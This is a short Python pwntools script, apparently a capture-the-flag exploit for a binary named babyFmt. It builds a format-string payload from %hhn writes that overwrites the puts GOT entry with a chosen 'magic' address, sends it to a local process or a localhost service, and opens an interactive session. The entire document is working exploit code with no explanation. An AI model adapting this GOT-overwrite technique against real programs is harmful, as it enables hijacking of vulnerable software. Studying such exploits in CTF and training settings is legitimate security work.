from pwn import *
import sys

context.arch = 'amd64'

Host = 'localhost'
Port = 10102

if len(sys.argv) > 1:
    r = remote(Host, Port)
else:
    r = process('./babyFmt')

ch_num = 0


def get_fmt_string(num, target):
    global ch_num
    if ch_num < num:
        ret = '%' + str(num-ch_num) + 'c'
    else:
        ret = '%' + str(256-ch_num+num) + 'c'
    ret += '%' + str(target) + '$hhn'
    ch_num = num
    return ret

magic = 0x400755
puts_got = 0x601018

### hijack puts_got to magic
payload = get_fmt_string(magic & 0xff, 28)
payload += get_fmt_string( (magic & 0xff00) >> 8, 29)
payload += get_fmt_string( (magic & 0xff0000) >> 16, 30)
payload = payload.ljust(0xa0, '\x00')
payload += p64(puts_got)
payload += p64(puts_got+1)
payload += p64(puts_got+2)

r.sendline(payload)
r.interactive()
